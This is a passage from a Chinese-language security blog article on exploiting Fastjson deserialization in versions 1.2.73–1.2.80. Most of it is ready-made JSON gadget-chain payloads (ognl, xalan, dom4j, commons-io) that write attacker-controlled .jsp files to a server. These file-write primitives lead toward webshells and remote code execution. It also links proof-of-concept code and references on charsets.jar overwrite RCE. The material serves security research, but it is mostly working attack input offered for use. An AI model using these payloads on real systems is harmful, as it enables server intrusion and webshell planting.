{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"},"su15":{"@type":"java.lang.Class","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"ognl.OgnlException","_evaluation":""}},"su16":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","is":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String""W01fh4ckeraaaaaa..."},"charsetName":"UTF-8","bufferSize":1024},"branch":{"@type":"org.apache.commons.io.output.WriterOutputStream","writer":{"@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"W01fh4cker.jsp","encoding":"UTF-8","append":false},"charsetName":"UTF-8","bufferSize":1024,"writeImmediately":true},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]}}}},"su17":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","is":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.su16.node.p.stream.delegate.reader.is.input"},"branch":{"$ref":"$.su16.node.p.stream.delegate.reader.is.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]}}}},"su18":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","is":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.su16.node.p.stream.delegate.reader.is.input"},"branch":{"$ref":"$.su16.node.p.stream.delegate.reader.is.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]}}}},"su19":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","is":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.su16.node.p.stream.delegate.reader.is.input"},"branch":{"$ref":"$.su16.node.p.stream.delegate.reader.is.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]}}}},}
```

![image-20231021212732555](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231021212732555.png)

### 5.2.2 ognl+commons-io 2.7~2.8版本

`payload49`：

```json
{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"},"su15":{"@type":"java.lang.Class","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"ognl.OgnlException","_evaluation":""}},"su16":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String""W01fh4ckeraaaaaa...","start":0,"end":2147483647},"charsetName":"UTF-8","bufferSize":1024},"branch":{"@type":"org.apache.commons.io.output.WriterOutputStream","writer":{"@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"W01fh4cker666.jsp","charsetName":"UTF-8","append":false},"charsetName":"UTF-8","bufferSize":1024,"writeImmediately":true},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]}}}},"su17":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.su16.node.p.stream.delegate.reader.inputStream.input"},"branch":{"$ref":"$.su16.node.p.stream.delegate.reader.inputStream.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]}}}},"su18":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.su16.node.p.stream.delegate.reader.inputStream.input"},"branch":{"$ref":"$.su16.node.p.stream.delegate.reader.inputStream.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]}}}},"su19":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.su16.node.p.stream.delegate.reader.inputStream.input"},"branch":{"$ref":"$.su16.node.p.stream.delegate.reader.inputStream.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]}}}}}
```

![image-20231021213615716](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231021213615716.png)

### 5.2.3 ognl+commons-io+aspectjtools+commons-codec组合利用链

这条链主要是为了解决前面提到的的`io`链无法写入复杂文件结构的问题，文件依旧需要大于`8kb`才能写入。`poc`地址如下：

> https://github.com/safe6Sec/ShiroAndFastJson/blob/master/src/main/java/com/shiro/vuln/fastjson/Fastjson26_ognl_io_write_4.java

## 5.3 xalan+dom4j+commons-io（1.2.73<=version<=1.2.80）

### 5.3.1 xalan+dom4j+commons-io（2.0~2.6版本）

分四步打，自行修改写入内容。

`payload50`（组合拳）：

```json
{"@type":"java.lang.Exception","@type":"org.apache.xml.dtm.DTMConfigurationException","locator":{}}
```

```json
{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.apache.xml.dtm.DTMConfigurationException","locator":{}}}}
```

```json
{"su14":{"@type":"javax.xml.transform.SourceLocator","@type":"org.apache.xpath.objects.XNodeSetForDOM","nodeIter":{"@type":"org.apache.xpath.NodeSet"},"xctxt":{"@type":"org.apache.xpath.XPathContext","primaryReader":{"@type":"org.dom4j.io.XMLWriter","entityResolver":{"@type":"org.dom4j.io.SAXContentHandler","inputSource":{"byteStream":{"@type":"java.io.InputStream"}}}}}}}
```

```json
{"su16":{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","is":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String""W01fh4ckeraaaaaa..."},"charsetName":"UTF-8","bufferSize":1024},"branch":{"@type":"org.apache.commons.io.output.WriterOutputStream","writer":{"@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"W01fh4cker888.jsp","encoding":"UTF-8","append":false},"charsetName":"UTF-8","bufferSize":1024,"writeImmediately":true},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]},"su17":{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","is":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.su16.delegate.reader.is.input"},"branch":{"$ref":"$.su16.delegate.reader.is.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]},"su18":{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","is":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.su16.delegate.reader.is.input"},"branch":{"$ref":"$.su16.delegate.reader.is.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]},"su19":{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","is":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.su16.delegate.reader.is.input"},"branch":{"$ref":"$.su16.delegate.reader.is.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]}}
```

![image-20231022115419944](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231022115419944.png)

### 5.3.2 xalan+dom4j+commons-io（2.7~2.8版本）

还是分四步打。

`payload51`（组合拳）：

```json
{"@type":"java.lang.Exception","@type":"org.apache.xml.dtm.DTMConfigurationException","locator":{}}
```

```json
{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.apache.xml.dtm.DTMConfigurationException","locator":{}}}}
```

```json
{"su14":{"@type":"javax.xml.transform.SourceLocator","@type":"org.apache.xpath.objects.XNodeSetForDOM","nodeIter":{"@type":"org.apache.xpath.NodeSet"},"xctxt":{"@type":"org.apache.xpath.XPathContext","primaryReader":{"@type":"org.dom4j.io.XMLWriter","entityResolver":{"@type":"org.dom4j.io.SAXContentHandler","inputSource":{"byteStream":{"@type":"java.io.InputStream"}}}}}}}
```

```json
{"su16":{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String""W01fh4ckeraaaaaa...","start":0,"end":2147483647},"charsetName":"UTF-8","bufferSize":1024},"branch":{"@type":"org.apache.commons.io.output.WriterOutputStream","writer":{"@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"W01fh4cker999.jsp","charsetName":"UTF-8","append":false},"charsetName":"UTF-8","bufferSize":1024,"writeImmediately":true},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]},"su17":{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.su16.delegate.reader.inputStream.input"},"branch":{"$ref":"$.su16.delegate.reader.inputStream.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]},"su18":{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.su16.delegate.reader.inputStream.input"},"branch":{"$ref":"$.su16.delegate.reader.inputStream.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]},"su19":{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.su16.delegate.reader.inputStream.input"},"branch":{"$ref":"$.su16.delegate.reader.inputStream.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36,82]}]}}
```

![image-20231022121619450](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231022121619450.png)

### 5.3.3 xalan+dom4j+commons-io+aspectjtools+commons-codec组合利用链

这条链主要是为了解决前面提到的的`io`链无法写入复杂文件结构的问题，文件依旧需要大于`8kb`才能写入。`poc`地址如下：

> https://github.com/safe6Sec/ShiroAndFastJson/blob/master/src/main/java/com/shiro/vuln/fastjson/Fastjson31_xalan_dom4j_io_write_4.java

## 5.4 覆盖charsets.jar导致RCE

这里不做复现，可参考：

> https://landgrey.me/blog/22/
>
> https://threedr3am.github.io/2021/04/14/JDK8任意文件写场景下的SpringBoot RCE/
>
> https://forum.butian.net/share/1623
>
> https://mp.weixin.qq.com/s/0yyZH_Axa0UTr8kquSixwQ

其中第四篇是对其做了完整详细的复现。

# 六、总结与致谢

由于接下来一段时间会很忙，因此还是决定把`fastjson`利用提高篇分两部分来写，第一部分也就是本文主要介绍各个`json`库之间的判断方法、`fastjson`版本判断方法、服务器环境的探测方法、文件读取的方法以及文件写入的方法。

在第二篇文章中，我们将讨论`fastjson`各版本的`rce`的`payload`、`fastjson`内网不出网情况下的利用、`fastjson`内存马注入。

由于经常熬夜，写文章的时候难免头脑发昏出现错误，欢迎在公众号后台或者我的朋友圈留言指出，我将在下一篇文章的开头对提出来的师傅进行感谢。

感谢以下师傅写的文章，本文或参考或引用，在他们的基础上进行了总结和修改：

```text
https://b1ue.cn/archives/402.html
https://blog.csdn.net/m0_71692682/article/details/125814861
https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA
https://github.com/safe6Sec/Fastjson
https://github.com/su18/hack-fastjson-1.2.80
https://kingx.me/Details-in-FastJson-RCE.html
https://blog.csdn.net/2301_77315080/article/details/133755409
https://hosch3n.github.io/2022/09/01/Fastjson1-2-80%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/
https://wangdudu.blog.csdn.net/article/details/121627213
https://blog.noah.360.net/blackhat-2021yi-ti-xiang-xi-fen-xi-fastjsonfan-xu-lie-hua-lou-dong-ji-zai-qu-kuai-lian-ying-yong-zhong-de-shen-tou-li-yong-2/
https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg
https://blog.51cto.com/u_15945480/6028934
https://mp.weixin.qq.com/s/SwkJVTW3SddgA6uy_e59qg
https://moonsec.top/articles/112
https://y4er.com/posts/fastjson-1.2.80/#gadget
https://www.freebuf.com/news/347174.html
https://www.freebuf.com/vuls/361576.html
https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf
https://b1ue.cn/archives/506.html
https://mp.weixin.qq.com/s?src=11×tamp=1697804173&ver=4846&signature=hOU1Dr6toY8j7eZ0B9ztaRNcZRvWXgr8SW4ER3pbsNrHVxEkxKqLB38qX3BOfN8XgTKqHR9wH70P9nKtKEw5-XzOXS3YoxcDFhn4fi-Gw*x6gswLM2I2zq2i7BZ-PwI1&new=1
https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html
https://forum.ezreal.cool/thread-117-1-1.html
https://tyskill.github.io/posts/fastjson%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%96%87%E4%BB%B6/
https://su18.org/post/fastjson/#%E5%9B%9B-payload
https://mp.weixin.qq.com/s/nKPsoNkHtNdOj-_v53Bc9w
https://xz.aliyun.com/t/12492#toc-4
https://landgrey.me/blog/22/
https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg
https://www.yulegeyu.com/
https://mp.weixin.qq.com/s/0yyZH_Axa0UTr8kquSixwQ
```

